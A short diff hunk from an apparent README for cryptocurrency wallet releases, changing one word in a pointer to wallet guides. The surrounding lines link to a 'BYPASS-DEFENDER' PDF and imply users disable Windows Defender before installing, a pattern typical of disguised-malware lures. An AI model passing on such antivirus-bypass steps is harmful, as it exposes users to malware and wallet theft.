@@ -81,7 +81,7 @@ Then you should be able to download and install freely. You can even activate Wi
 For a PDF menu navigation guide, see here: https://github.com/UnvsCom/Current-Wallet-Releases/blob/main/BYPASS-DEFENDER.pdf
 
 
-✪ Also remember to review our Wallet Guides ✪
+✪ Also remember to read our Wallet Guides ✪
 ----------------------------------------------
 https://github.com/UnvsCom/unvs/blob/v1.6/WALLET-COMMANDS.md
 
